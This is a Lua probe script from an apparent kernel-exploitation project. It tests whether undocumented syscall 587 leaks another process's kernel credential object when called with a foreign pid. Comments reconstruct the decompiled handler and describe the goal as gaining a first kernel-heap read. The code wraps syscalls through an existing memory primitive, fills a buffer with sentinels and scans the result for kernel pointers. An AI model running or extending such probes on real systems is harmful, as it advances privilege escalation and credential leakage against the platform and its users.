-- CRASH_CLASS: LOW
-- PROBE 1068a: sys 587 takes a pid -- does it hand back another process's credential?
-- results/kernel_handlers/decompiled/sys_587.c:135-160 (analyst reconstruction):
--   if (uap->pid == 0) { p = td->proc; }
--   else { p = process_lookup_locked(uap->pid); if (!p) return 3;
--          error = process_visibility(td, p); if (error) { unlock; return error; } }
--   if (privilege_check(td, 0x2ae) == 0) memcpy(&record, &p->cred->authid, 0x88);
--   else { authid = masked; capabilities = masked; }
--   copyout(&record, uap->user_record, 0x88);
-- We have only ever called it with pid 0 (own proc, masked path).  If the visibility
-- check lets any pid through, the privileged branch is a 0x88-byte read of a *kernel
-- heap object* belonging to another process -- not arbitrary read, but the first
-- kernel-heap read we would have.  A returned 0 with a zeroed buffer means EPERM.
print("=== PROBE 1068a: sys 587 with a foreign pid ===")
local function to_num(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function as_addr(x) local m=tostring(x):match("0x(%x+)"); if m then return tonumber(m,16) end return to_num(x) end
local function hi_of(q) if type(q)=="table" and q.h then return q.h,q.l end local n=to_num(q) return math.floor(n/4294967296), n%4294967296 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function wd(a,v) pcall(function() memory.write_dword(uint64(a),uint64(v)) end) end
local function rq(a) local o,v=pcall(function() return memory.read_qword(uint64(a)) end) if o then return v end return nil end

local sc587,sc_pid = mk(587),mk(20)
local mpid = to_num(select(2,pcall(function() return sc_pid() end)))
print(string.format("[S] pid=%d", mpid))

local out=memory.alloc(0x100); local oa=as_addr(out)
if oa==0 then print("[!] alloc failed"); return end
local SENT=0xCDCDCDCDCDCDCDCD
local function zero() for i=0,0x100/8-1 do pcall(function() memory.write_qword(uint64(oa+i*8),uint64(SENT)) end) end end
local function scan()
  local touched,kp,first=0,0,""
  for i=0,0x100/8-1 do
    local vq=rq(oa+i*8); local v=vq and to_num(vq) or 0
    if v~=SENT then
      touched=touched+1
      local h,l=hi_of(vq or 0)
      if h>=0xFFFF8000 then kp=kp+1; if kp<=2 then first=first..string.format(" +%X=%X_%08X",i*8,h,l) end end
    end
  end
  return touched,kp,first
end

local pids={0,1,2,3,4,5,6,7,mpid}
for _,p in ipairs(pids) do
  zero()
  local ok,rv=pcall(function() return sc587(uint64(p),uint64(oa),uint64(0),uint64(0),uint64(0),uint64(0)) end)
  local r = ok and to_num(rv) or -999
  local t,kp,first=scan()
  local a=rq(oa) or 0; local ah,al=hi_of(a)
  local c=rq(oa+8) or 0; local ch,cl=hi_of(c)
  print(string.format("[Q] pid=%d rv=%d touched=%d kp=%d authid=%X_%08X caps=%X_%08X%s",
    p, r, t, kp, ah, al, ch, cl, first))
  if r==-999 then print("[!] call raised; stopping"); break end
end
print("[Z] done pid="..to_num(select(2,pcall(function() return sc_pid() end))))
